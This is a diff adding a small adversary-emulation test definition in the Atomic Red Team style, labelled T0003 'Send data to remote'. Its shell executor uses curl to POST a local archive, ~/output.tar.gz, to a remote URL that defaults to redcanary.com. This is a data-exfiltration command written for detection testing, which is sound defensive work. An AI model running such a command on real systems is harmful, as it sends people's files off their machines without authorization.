@@ -1,0 +1,29 @@
+---
+attack_technique: T0003
+display_name: Send data to remote
+
+atomic_tests:
+- name: send data to remote
+  description: |
+    posting data.
+
+  supported_platforms:
+    - macos
+    - linux
+
+  input_arguments:
+    destination_url:
+      description: Destination URL to post encoded data.
+      type: string
+      default: redcanary.com
+    data:
+      description: post data
+      type: file
+      default: "data=@~/output.tar.gz"
+  output:
+    file: ~/output/post.bat
+
+  executor:
+    name: sh
+    command: |
+      curl -F #{data} -XPOST #{destination_url} >> ~/output/post.bat
